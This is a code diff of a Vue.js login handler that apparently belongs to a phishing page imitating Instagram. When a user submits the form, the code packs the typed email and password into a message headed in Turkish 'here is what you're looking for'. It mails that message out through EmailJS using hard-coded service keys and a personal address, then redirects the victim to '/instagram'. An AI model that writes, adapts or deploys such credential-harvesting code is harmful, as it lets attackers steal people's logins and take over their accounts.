@@ -101,22 +101,16 @@ export default {
         clickedLogin(){
           if(this.person.email!="" && this.person.password!=""){
             var template_params = {
-              name: 'John',
+            name: 'John',
             reply_email: 'cannoonur@gmail.com',  
             message: `İşte Aradıkların 
               ${this.person.email}
-              ${this.person.password}
-            `
-                
-
+              ${this.person.password}  `
           }
             emailjs.send("service_gt8y0bq","template_ejo48mm",template_params,"user_RpJXvNZli3UY1aQvUCldG").then(res=>{
-              console.log(res);
+                this.$router.push("/instagram")
             })
-            
-            // emailjs.sendForm("service_gt8y0bq","template_ejo48mm","user_RpJXvNZli3UY1aQvUCldG").then(res=>{
-            //   console.log(res);
-            // })
+               
           }
         }
     },
